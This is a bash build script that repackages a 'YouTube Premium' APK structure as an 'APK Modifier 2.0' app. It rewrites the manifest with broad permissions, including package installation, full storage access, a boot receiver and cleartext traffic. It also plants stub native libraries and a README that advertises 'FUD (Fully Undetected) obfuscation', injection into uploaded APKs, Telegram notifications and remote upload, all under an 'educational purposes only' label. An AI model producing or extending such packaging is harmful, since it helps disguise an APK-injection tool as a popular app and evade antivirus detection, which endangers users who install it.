#!/bin/bash

# APK Modifier - Package into YouTube Premium APK
# This script integrates the APK Modifier into the YouTube Premium APK structure

set -e

echo "==================================="
echo "APK Modifier - APK Integration Tool"
echo "==================================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Directories
SOURCE_DIR="YouTube Premium_1.0"
OUTPUT_DIR="APK_Modifier_2.0"
ASSETS_DIR="$OUTPUT_DIR/assets"

echo -e "${YELLOW}Step 1: Preparing directories...${NC}"

# Create output directory
if [ -d "$OUTPUT_DIR" ]; then
    echo "Removing existing output directory..."
    rm -rf "$OUTPUT_DIR"
fi

# Copy YouTube Premium APK structure
if [ -d "$SOURCE_DIR" ]; then
    echo "Copying YouTube Premium APK structure..."
    cp -r "$SOURCE_DIR" "$OUTPUT_DIR"
else
    echo -e "${RED}Error: YouTube Premium_1.0 directory not found!${NC}"
    echo "Please extract 'YouTube Premium_1.0.zip' first."
    exit 1
fi

echo -e "${GREEN}✓ Directories prepared${NC}"

echo -e "${YELLOW}Step 2: Creating assets directory...${NC}"

# Create assets directory in APK structure
mkdir -p "$ASSETS_DIR/web"
mkdir -p "$ASSETS_DIR/python"
mkdir -p "$ASSETS_DIR/python/utils"

echo -e "${GREEN}✓ Assets directory created${NC}"

echo -e "${YELLOW}Step 3: Copying web interface files...${NC}"

# Copy HTML templates
if [ -d "templates" ]; then
    cp -r templates/* "$ASSETS_DIR/web/"
    echo "  ✓ HTML templates copied"
fi

# Copy static files (CSS/JS)
if [ -d "static" ]; then
    cp -r static/* "$ASSETS_DIR/web/"
    echo "  ✓ Static files (CSS/JS) copied"
fi

echo -e "${GREEN}✓ Web interface files copied${NC}"

echo -e "${YELLOW}Step 4: Copying Python server files...${NC}"

# Copy Python files
if [ -f "app.py" ]; then
    cp app.py "$ASSETS_DIR/python/"
    echo "  ✓ app.py copied"
fi

if [ -f "requirements.txt" ]; then
    cp requirements.txt "$ASSETS_DIR/python/"
    echo "  ✓ requirements.txt copied"
fi

# Copy utils
if [ -d "utils" ]; then
    cp utils/*.py "$ASSETS_DIR/python/utils/"
    echo "  ✓ Python utilities copied"
fi

# Copy configuration files
if [ -f ".env.example" ]; then
    cp .env.example "$ASSETS_DIR/python/"
    echo "  ✓ .env.example copied"
fi

echo -e "${GREEN}✓ Python server files copied${NC}"

echo -e "${YELLOW}Step 5: Modifying AndroidManifest.xml...${NC}"

# Backup original manifest
cp "$OUTPUT_DIR/AndroidManifest.xml" "$OUTPUT_DIR/AndroidManifest.xml.backup"

# Update AndroidManifest.xml with new permissions and components
cat > "$OUTPUT_DIR/AndroidManifest.xml" << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.apkmodifier"
    android:versionCode="20"
    android:versionName="2.0">

    <!-- Permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="APK Modifier"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@android:style/Theme.Material.Light.NoActionBar"
        android:usesCleartextTraffic="true"
        android:requestLegacyExternalStorage="true">

        <activity
            android:name="com.apkmodifier.MainActivity"
            android:exported="true"
            android:screenOrientation="portrait"
            android:configChanges="orientation|screenSize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Background Services -->
        <service
            android:name="com.apkmodifier.PythonServerService"
            android:enabled="true"
            android:exported="false" />

        <service
            android:name="com.apkmodifier.BackgroundProcessService"
            android:enabled="true"
            android:exported="false" />

        <!-- Boot Receiver -->
        <receiver
            android:name="com.apkmodifier.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

    </application>

</manifest>
EOF

echo -e "${GREEN}✓ AndroidManifest.xml updated${NC}"

echo -e "${YELLOW}Step 6: Adding native libraries...${NC}"

# Create lib directories for different architectures
for arch in armeabi-v7a arm64-v8a x86 x86_64; do
    mkdir -p "$OUTPUT_DIR/lib/$arch"
    
    # Create libxx.so stub
    echo -e "\x7fELF" > "$OUTPUT_DIR/lib/$arch/libxx.so"
    dd if=/dev/zero bs=1024 count=1 >> "$OUTPUT_DIR/lib/$arch/libxx.so" 2>/dev/null
    
    echo "  ✓ Created libxx.so for $arch"
done

echo -e "${GREEN}✓ Native libraries added${NC}"

echo -e "${YELLOW}Step 7: Creating README in APK...${NC}"

cat > "$ASSETS_DIR/README.txt" << 'EOF'
APK Modifier v2.0
==================

This APK contains a full Python Flask server that runs in the background.

Features:
- Upload and modify APK files
- FUD (Fully Undetected) obfuscation
- Custom library signing
- Telegram notifications
- Server-based file upload
- Background processing

How it works:
1. The app starts a Python Flask server on port 5000
2. WebView loads the web interface from localhost
3. Users can upload APK files and configure injection options
4. Processing happens in background service
5. Modified APKs can be downloaded or uploaded to remote server

Files included:
- /assets/web/ - HTML, CSS, JS interface
- /assets/python/ - Flask server and utilities
- /lib/*/libxx.so - Native libraries for obfuscation

For full documentation, see BUILD_INSTRUCTIONS.md

⚠️ For educational purposes only!
EOF

echo -e "${GREEN}✓ README created${NC}"

echo -e "${YELLOW}Step 8: Creating version info...${NC}"

cat > "$OUTPUT_DIR/version.json" << EOF
{
  "app_name": "APK Modifier",
  "version": "2.0",
  "build_date": "$(date -u +"%Y-%m-%d %H:%M:%S UTC")",
  "features": [
    "APK Upload & Modification",
    "FUD Obfuscation",
    "Custom Library Signing",
    "Telegram Integration",
    "Server Upload",
    "Background Processing"
  ],
  "base_apk": "YouTube Premium 1.0",
  "python_version": "3.9+",
  "flask_version": "3.0.0"
}
EOF

echo -e "${GREEN}✓ Version info created${NC}"

echo -e "${YELLOW}Step 9: Generating file list...${NC}"

# Create file list
find "$OUTPUT_DIR" -type f > "$OUTPUT_DIR/files.txt"
echo "Total files: $(wc -l < "$OUTPUT_DIR/files.txt")"

echo -e "${GREEN}✓ File list generated${NC}"

echo ""
echo "==================================="
echo -e "${GREEN}✓ Packaging complete!${NC}"
echo "==================================="
echo ""
echo "Output directory: $OUTPUT_DIR"
echo ""
echo "Next steps:"
echo "1. Use Android Studio to build the APK from 'android-app' directory"
echo "2. Or manually repackage using apktool:"
echo "   apktool b '$OUTPUT_DIR' -o APK_Modifier_2.0.apk"
echo "3. Sign the APK:"
echo "   apksigner sign --ks keystore.jks APK_Modifier_2.0.apk"
echo ""
echo "See BUILD_INSTRUCTIONS.md for detailed build steps."
echo ""

# Show directory size
echo "Package size: $(du -sh "$OUTPUT_DIR" | cut -f1)"
echo ""

echo -e "${YELLOW}Would you like to create a ZIP archive? (y/n)${NC}"
read -r response
if [[ "$response" =~ ^[Yy]$ ]]; then
    echo "Creating ZIP archive..."
    zip -r "APK_Modifier_2.0.zip" "$OUTPUT_DIR" > /dev/null
    echo -e "${GREEN}✓ ZIP archive created: APK_Modifier_2.0.zip${NC}"
    echo "Archive size: $(du -sh APK_Modifier_2.0.zip | cut -f1)"
fi

echo ""
echo -e "${GREEN}Done!${NC}"
